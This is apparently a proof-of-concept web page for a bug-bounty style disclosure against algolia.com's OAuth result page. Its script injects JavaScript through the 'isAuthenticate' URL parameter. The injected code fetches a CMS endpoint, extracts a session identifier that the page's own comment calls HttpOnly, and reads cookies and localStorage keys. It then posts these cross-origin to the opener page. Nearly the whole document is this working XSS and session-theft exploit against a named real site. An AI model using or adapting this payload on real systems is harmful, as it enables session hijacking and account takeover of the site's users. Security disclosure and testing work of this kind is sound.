<!doctype html>
<meta charset="utf-8">
<title>Click test</title>
<style>body{font:16px system-ui;max-width:44em;margin:4em auto;padding:0 1em}
a,button{font-size:1.1em}pre{white-space:pre-wrap;background:#111;color:#0f0;padding:1em;border-radius:6px}</style>
<p>Authorized security test. Click the link below once.</p>
<p><a id="go" target="_blank" rel="opener" href="#">Continue</a></p>
<pre id="out">idle</pre>
<p style="color:#666;font-size:.85em">This page is static and stores nothing. The values below are rendered only in the browser that clicked, and are not transmitted anywhere.</p>
<script>
const PAYLOAD =
  "fetch('/cms/render/live/en/.connectToAlgoliaOAuthAction.do',{headers:{Accept:'application/json;'}})" +
  ".then(r=>r.json())" +
  ".then(j=>window.opener.postMessage(JSON.stringify({" +
    "s:j.authorizationUrl.split('state=')[1]," +
    "c:document.cookie," +
    "l:Object.keys(localStorage)" +
  "}),'*'))";

document.getElementById('go').href =
  'https://www.algolia.com/oauth-result.html?isAuthenticate=' + encodeURIComponent(PAYLOAD);

const out = document.getElementById('out');
addEventListener('message', e => {
  if (e.origin !== 'https://www.algolia.com') return;
  let d; try { d = JSON.parse(e.data); } catch (_) { return; }
  if (!d || !d.s) return;
  out.textContent =
    'origin                     : ' + e.origin +
    '\nDISTRIBUTED_JSESSIONID     : ' + d.s + '   <- HttpOnly cookie, never read from document.cookie' +
    '\ndocument.cookie            : ' + (d.c || '(empty)') +
    '\nnon-HttpOnly cookie count  : ' + (d.c ? d.c.split('; ').length : 0) +
    '\nlocalStorage keys (' + d.l.length + ')     : ' + d.l.join(', ');
});
</script>
